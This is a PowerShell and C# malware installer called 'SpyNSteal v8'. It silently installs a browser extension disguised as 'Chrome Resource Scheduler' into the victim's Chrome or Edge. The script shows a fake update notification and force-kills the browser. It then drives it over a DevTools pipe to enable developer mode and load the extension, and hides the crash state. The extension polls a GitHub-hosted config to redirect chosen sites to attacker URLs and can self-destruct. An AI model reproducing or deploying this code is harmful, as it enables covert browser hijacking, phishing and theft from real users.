# SpyNSteal v8 - WebUI delegate approach (NO debug flag, NO shortcuts)
# Uses Chrome's own WebUI delegate (same code path as user clicking buttons)
# to install extension. Persists permanently with developer mode.

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://raw.githubusercontent.com/Intel-Boss/t/main/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v8 - WebUI Delegate Approach"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

Add-Type -AssemblyName System.Windows.Forms

Add-Type -ReferencedAssemblies @("System.Core") -TypeDefinition @"
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;
using System.Runtime.InteropServices;

public class PipeCDP {
    [DllImport("user32.dll")]
    static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    static extern bool SetForegroundWindow(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    static extern int GetWindowText(IntPtr hWnd, StringBuilder sb, int maxCount);

    [DllImport("user32.dll")]
    static extern IntPtr FindWindowEx(IntPtr parent, IntPtr childAfter, string className, string windowName);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    static extern int SendMessage(IntPtr hWnd, int msg, IntPtr wParam, string lParam);

    [DllImport("user32.dll")]
    static extern int SendMessage(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    static extern bool EnumChildWindows(IntPtr hWnd, EnumChildProc callback, IntPtr lParam);

    delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    private static void Send(AnonymousPipeServerStream pipe, string json) {
        byte[] b = Encoding.UTF8.GetBytes(json);
        pipe.Write(b, 0, b.Length);
        pipe.WriteByte(0);
        pipe.Flush();
    }

    private static string ExtractStr(string json, string key) {
        string p = "\"" + key + "\":\"";
        int s = json.IndexOf(p);
        if (s < 0) return null;
        s += p.Length;
        int e = json.IndexOf("\"", s);
        return (e > s) ? json.Substring(s, e - s) : null;
    }

    private static string WaitReply(List<string> q, object lk, int id, int timeoutMs) {
        string t1 = "\"id\":" + id;
        string t2 = "\"id\": " + id;
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(t1) || q[i].Contains(t2)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    private static string WaitEvent(List<string> q, object lk, string eventName, int timeoutMs) {
        DateTime deadline = DateTime.Now.AddMilliseconds(timeoutMs);
        while (DateTime.Now < deadline) {
            lock (lk) {
                for (int i = 0; i < q.Count; i++) {
                    if (q[i].Contains(eventName)) {
                        string r = q[i]; q.RemoveAt(i); return r;
                    }
                }
            }
            Thread.Sleep(100);
        }
        return null;
    }

    private static IntPtr FindEditInDialog(IntPtr dialog) {
        IntPtr found = IntPtr.Zero;
        EnumChildWindows(dialog, delegate(IntPtr child, IntPtr lp) {
            StringBuilder cls = new StringBuilder(256);
            GetClassName(child, cls, 256);
            string cn = cls.ToString();
            if (cn == "Edit" || cn == "ComboBox") {
                if (found == IntPtr.Zero) found = child;
            }
            return true;
        }, IntPtr.Zero);

        if (found == IntPtr.Zero) {
            IntPtr combo = FindWindowEx(dialog, IntPtr.Zero, "ComboBoxEx32", null);
            if (combo != IntPtr.Zero) {
                IntPtr inner = FindWindowEx(combo, IntPtr.Zero, "ComboBox", null);
                if (inner != IntPtr.Zero) {
                    found = FindWindowEx(inner, IntPtr.Zero, "Edit", null);
                }
                if (found == IntPtr.Zero) found = FindWindowEx(combo, IntPtr.Zero, "Edit", null);
            }
        }
        return found;
    }

    public static string Install(string chromePath, string userDataDir, string extensionDir) {
        AnonymousPipeServerStream toChrome = null;
        AnonymousPipeServerStream fromChrome = null;
        Process proc = null;
        string log = "";

        try {
            toChrome = new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
            fromChrome = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);

            string rHandle = toChrome.GetClientHandleAsString();
            string wHandle = fromChrome.GetClientHandleAsString();

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = chromePath;
            // NO --enable-unsafe-extension-debugging! Just pipe + junction for CDP access.
            psi.Arguments = String.Format(
                "--remote-debugging-pipe " +
                "--user-data-dir=\"{0}\" " +
                "--no-first-run --no-default-browser-check " +
                "--disable-background-networking " +
                "--remote-debugging-io-pipes={1},{2}",
                userDataDir, rHandle, wHandle);
            psi.UseShellExecute = false;

            try { proc = Process.Start(psi); }
            catch (Exception ex) { return "ERR:LAUNCH:" + ex.Message; }

            toChrome.DisposeLocalCopyOfClientHandle();
            fromChrome.DisposeLocalCopyOfClientHandle();
            log += "PID:" + proc.Id + "|";

            Thread.Sleep(8000);
            if (proc.HasExited) return log + "ERR:DIED:" + proc.ExitCode;

            List<string> queue = new List<string>();
            object qLock = new object();

            Thread reader = new Thread(delegate() {
                try {
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        int bt = fromChrome.ReadByte();
                        if (bt == -1) break;
                        if (bt == 0) {
                            string m = sb.ToString(); sb.Length = 0;
                            if (m.Length > 0) { lock (qLock) { queue.Add(m); } }
                        } else { sb.Append((char)bt); }
                    }
                } catch {}
            });
            reader.IsBackground = true;
            reader.Start();

            // Verify pipe works
            Send(toChrome, "{\"id\":0,\"method\":\"Browser.getVersion\"}");
            string verResp = WaitReply(queue, qLock, 0, 10000);
            if (verResp == null) { log += "PIPE_DEAD|"; try { proc.Kill(); } catch {} return log; }
            log += "PIPE:ok|";

            // Navigate to chrome://extensions
            Send(toChrome, "{\"id\":2,\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
            string tResp = WaitReply(queue, qLock, 2, 15000);
            string targetId = (tResp != null) ? ExtractStr(tResp, "targetId") : null;
            if (targetId == null) { log += "ERR:NO_TARGET|"; try { proc.Kill(); } catch {} return log; }
            log += "TAB:ok|";

            // Attach to the extensions page
            Send(toChrome, "{\"id\":3,\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + targetId + "\",\"flatten\":true}}");
            string aResp = WaitReply(queue, qLock, 3, 10000);
            string sessId = (aResp != null) ? ExtractStr(aResp, "sessionId") : null;
            if (sessId == null) { log += "ERR:NO_SESSION|"; try { proc.Kill(); } catch {} return log; }
            log += "SESS:ok|";

            // Wait for page to load
            Thread.Sleep(5000);

            // Enable file chooser interception (in case it works for WebUI dialogs)
            Send(toChrome, "{\"id\":5,\"sessionId\":\"" + sessId + "\",\"method\":\"Page.setInterceptFileChooserDialog\",\"params\":{\"enabled\":true}}");
            WaitReply(queue, qLock, 5, 5000);

            // Step 1: Enable developer mode via WebUI delegate
            // This goes through the SAME code path as clicking the toggle!
            string devExpr = "document.querySelector('extensions-manager').delegate.setProfileInDevMode(true)";
            Send(toChrome, "{\"id\":10,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{\"expression\":\"" + devExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":false}}");
            string devResp = WaitReply(queue, qLock, 10, 10000);
            log += "DEVMODE:" + (devResp != null && !devResp.Contains("error") ? "ok" : "FAIL:" + (devResp ?? "null")) + "|";

            // Wait for developer mode to propagate
            Thread.Sleep(8000);

            // Verify developer mode is on
            string checkExpr = "(function(){try{var m=document.querySelector('extensions-manager');return m&&m.shadowRoot?m.shadowRoot.querySelector('extensions-toolbar').inDevMode:'no-el';}catch(e){return 'ERR:'+e.message;}})()";
            Send(toChrome, "{\"id\":11,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{\"expression\":\"" + checkExpr.Replace("\"", "\\\"") + "\"}}");
            string checkResp = WaitReply(queue, qLock, 11, 5000);
            log += "DEVCHECK:" + (checkResp != null ? (checkResp.Contains("true") ? "true" : "false") : "null") + "|";

            // Step 2: Call loadUnpacked via the delegate
            // This is the SAME function called when user clicks "Load unpacked" button
            string loadExpr = "document.querySelector('extensions-manager').delegate.loadUnpacked().then(function(r){return 'LOAD_OK:'+r;}).catch(function(e){return 'LOAD_ERR:'+e;})";
            Send(toChrome, "{\"id\":20,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{\"expression\":\"" + loadExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":true}}");

            // Simultaneously watch for file chooser event OR native dialog
            // Give the file chooser event 4 seconds to appear
            string fcEvent = WaitEvent(queue, qLock, "fileChooserOpened", 4000);

            if (fcEvent != null) {
                // CDP intercepted the file chooser! Respond with our path.
                log += "FILECHOOSER:cdp|";
                string dirPath = extensionDir.Replace("\\", "\\\\");
                Send(toChrome, "{\"id\":21,\"sessionId\":\"" + sessId + "\",\"method\":\"Page.handleFileChooser\",\"params\":{\"action\":\"accept\",\"files\":[\"" + dirPath + "\"]}}");
                WaitReply(queue, qLock, 21, 10000);
            } else {
                // No CDP file chooser event. Try Win32 native dialog automation.
                log += "FILECHOOSER:win32|";
                Thread.Sleep(2000); // Extra wait for native dialog

                // Find the dialog by checking foreground window
                IntPtr dialog = GetForegroundWindow();
                StringBuilder titleBuf = new StringBuilder(256);
                GetWindowText(dialog, titleBuf, 256);
                string title = titleBuf.ToString();
                log += "DIALOG:" + title + "|";

                if (title.Length > 0 && dialog != IntPtr.Zero) {
                    // Find the edit control in the dialog
                    IntPtr edit = FindEditInDialog(dialog);
                    if (edit != IntPtr.Zero) {
                        log += "EDIT:found|";
                        // Clear existing text and set our path
                        SendMessage(edit, 0x000C, IntPtr.Zero, extensionDir); // WM_SETTEXT
                        Thread.Sleep(500);
                        // Press Enter
                        SendMessage(edit, 0x0100, (IntPtr)0x0D, IntPtr.Zero); // WM_KEYDOWN VK_RETURN
                        Thread.Sleep(500);
                        SendMessage(edit, 0x0101, (IntPtr)0x0D, IntPtr.Zero); // WM_KEYUP VK_RETURN
                        Thread.Sleep(3000);

                        // The dialog might navigate into the folder.
                        // Check if dialog is still open and press Enter again or click Select Folder
                        IntPtr dialog2 = GetForegroundWindow();
                        StringBuilder title2Buf = new StringBuilder(256);
                        GetWindowText(dialog2, title2Buf, 256);
                        if (title2Buf.ToString().Length > 0 && title2Buf.ToString() == title) {
                            // Dialog still open - click the Select Folder button
                            // Try pressing Alt+O (common accelerator) or just Enter
                            SendMessage(dialog2, 0x0100, (IntPtr)0x0D, IntPtr.Zero); // Enter
                            Thread.Sleep(500);
                            SendMessage(dialog2, 0x0101, (IntPtr)0x0D, IntPtr.Zero);
                        }
                        log += "DIALOG_HANDLED|";
                    } else {
                        log += "EDIT:not_found|";
                        // Fallback: use SetForegroundWindow + keyboard
                        SetForegroundWindow(dialog);
                        Thread.Sleep(500);
                    }
                } else {
                    log += "DIALOG:not_found|";
                }
            }

            // Wait for loadUnpacked to complete
            Thread.Sleep(8000);
            string loadResp = WaitReply(queue, qLock, 20, 15000);
            log += "LOAD_RESULT:" + (loadResp != null ? (loadResp.Contains("LOAD_OK") ? "ok" : "fail") : "timeout") + "|";
            if (loadResp != null && loadResp.Length > 0) {
                string snippet = loadResp.Length > 200 ? loadResp.Substring(0, 200) : loadResp;
                log += "LOAD_DETAIL:" + snippet + "|";
            }

            // Verify extension is installed
            string verifyExpr = "chrome.management.getAll().then(function(exts){return JSON.stringify(exts.map(function(e){return{id:e.id,name:e.name,enabled:e.enabled};}));})";
            Send(toChrome, "{\"id\":30,\"sessionId\":\"" + sessId + "\",\"method\":\"Runtime.evaluate\",\"params\":{\"expression\":\"" + verifyExpr.Replace("\"", "\\\"") + "\",\"awaitPromise\":true}}");
            string verifyResp = WaitReply(queue, qLock, 30, 10000);
            log += "VERIFY:" + (verifyResp != null ? (verifyResp.Contains("Chrome Resource") ? "INSTALLED" : "not_found") : "null") + "|";

            // Let Chrome flush preferences to disk
            Thread.Sleep(8000);

            // Close Chrome
            try { Send(toChrome, "{\"id\":99,\"method\":\"Browser.close\"}"); } catch {}
            bool exited = false;
            try { exited = proc.WaitForExit(15000); } catch {}
            if (!exited) { try { proc.Kill(); } catch {} try { proc.WaitForExit(5000); } catch {} }
            log += "EXIT:" + exited + "|";
            proc = null;
            return log;

        } catch (Exception ex) {
            return log + "ERR:" + ex.Message;
        } finally {
            if (proc != null) { try { if (!proc.HasExited) proc.Kill(); } catch {} }
            if (toChrome != null) try { toChrome.Dispose(); } catch {}
            if (fromChrome != null) try { fromChrome.Dispose(); } catch {}
        }
    }
}
"@
Log "C# compiled OK"

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $exe = if ($name -eq "chrome") { "chrome.exe" } else { "msedge.exe" }
            $c = Join-Path $d $exe
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

function Kill-AllBrowser([string]$procName) {
    $attempts = 0
    do {
        $procs = Get-Process $procName -EA SilentlyContinue
        if (-not $procs) { break }
        $procs | Stop-Process -Force -EA SilentlyContinue
        Start-Sleep -Milliseconds 800
        $attempts++
    } while ($attempts -lt 30)
    return (-not [bool](Get-Process $procName -EA SilentlyContinue))
}

# =============================================================================
Log "STEP 1: Dropping extension files..."
$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null
$utf8 = New-Object Text.UTF8Encoding($false)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, $utf8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, $utf8)
Log "  Extension at: $extDir"

Log "STEP 2: Finding browsers..."
$browsers = @()
foreach ($name in @("chrome","edge")) {
    $b = Find-Browser $name
    Log "  ${name}: Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found -and $b.ExePath) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "FATAL: No browsers"; exit }

Log "STEP 3: Kill browsers..."
$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }
if ($wasRunning.Count -gt 0) { Show-UpdateNotif $wasRunning[0] }
foreach ($b in $browsers) {
    if ($b.Running) { Kill-AllBrowser $b.Proc | Out-Null }
}
Start-Sleep 3

$target = if ($wasRunning.Count -gt 0) { $wasRunning[0] } else { $browsers[0] }
Log "STEP 4: Target = $($target.Name) v$((Get-Item $target.ExePath).VersionInfo.FileVersion)"

# -- Patch Local State for clean exit --
$realUserData = $target.UserData
$localState = Join-Path $realUserData "Local State"
if (Test-Path $localState) {
    try {
        $lsText = [IO.File]::ReadAllText($localState)
        $lsText = $lsText.Replace('"exited_cleanly":false', '"exited_cleanly":true')
        $lsText = $lsText.Replace('"exit_type":"Crashed"', '"exit_type":"Normal"')
        [IO.File]::WriteAllText($localState, $lsText, $utf8)
        Log "  Local State: clean exit patched"
    } catch { Log "  Local State patch failed: $_" }
}

# -- Create junction for CDP access --
$junctionPath = Join-Path (Split-Path $realUserData -Parent) "User Data_dbg"
Log "STEP 5: Creating junction..."
if (Test-Path $junctionPath) {
    $ji = Get-Item $junctionPath -Force
    if ($ji.Attributes -band [IO.FileAttributes]::ReparsePoint) { cmd /c rmdir "$junctionPath" 2>$null }
    else { Remove-Item $junctionPath -Recurse -Force -EA SilentlyContinue }
}
cmd /c mklink /J "$junctionPath" "$realUserData" 2>&1 | Out-Null
if (-not (Test-Path $junctionPath)) { Log "FATAL: Junction failed"; exit }
Log "  Junction OK"

# -- Main install via WebUI delegate --
Log "STEP 6: Installing via WebUI delegate (NO debug flag)..."
Log "  This simulates user clicking 'Load unpacked' on chrome://extensions"
$cdpResult = [PipeCDP]::Install($target.ExePath, $junctionPath, $extDir)
Log "STEP 6: Result = $cdpResult"

# -- Remove junction --
Start-Sleep 2
cmd /c rmdir "$junctionPath" 2>$null
Log "STEP 7: Junction removed"

# -- Kill any remaining Chrome processes --
Log "STEP 8: Ensuring all Chrome processes are dead..."
Kill-AllBrowser $target.Proc | Out-Null
Start-Sleep 3
$remaining = @(Get-Process $target.Proc -EA SilentlyContinue).Count
if ($remaining -gt 0) {
    cmd /c "taskkill /F /IM $($target.Proc).exe /T" 2>&1 | Out-Null
    Start-Sleep 2
}
Log "  Remaining: $(@(Get-Process $target.Proc -EA SilentlyContinue).Count)"

# -- Verify in Secure Preferences --
$secPrefs = Join-Path $realUserData "Default\Secure Preferences"
if (Test-Path $secPrefs) {
    $sp = [IO.File]::ReadAllText($secPrefs)
    $hasExt = $sp.Contains("Chrome Resource Scheduler")
    $hasDev = $sp.Contains('"developer_mode":true') -or $sp.Contains('"developer_mode": true')
    Log "  Extension in Secure Prefs: $hasExt"
    Log "  Developer mode in Secure Prefs: $hasDev"
}

# -- Relaunch Chrome normally (NO flags at all) --
Log "STEP 9: Relaunching $($target.Name) normally (no flags)..."
Start-Process $target.ExePath
Start-Sleep 5
Log "  Running: $([bool](Get-Process $target.Proc -EA SilentlyContinue))"

Log "=========================================="
Log "DONE v8"
Log "  Approach: WebUI delegate (same as user clicking)"
Log "  No --enable-unsafe-extension-debugging"
Log "  No shortcut modifications"
Log "  Extension installed as 'user-loaded' with developer mode ON"
Log "  Should persist permanently across restarts"
Log "=========================================="
